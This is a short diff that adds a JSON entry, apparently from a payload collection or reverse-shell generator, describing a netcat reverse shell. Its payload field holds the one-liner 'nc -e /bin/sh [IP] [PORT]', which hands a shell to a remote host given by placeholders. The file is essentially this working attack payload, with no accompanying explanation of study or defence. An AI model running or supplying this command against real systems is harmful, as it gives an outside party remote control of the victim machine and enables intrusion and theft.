@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "Creates a reverse shell using netcat",
+      "type": "reverse",
+      "exec": "bash"
+    },
+    "payload": "nc -e /bin/sh [IP] [PORT]"
+  }
+}
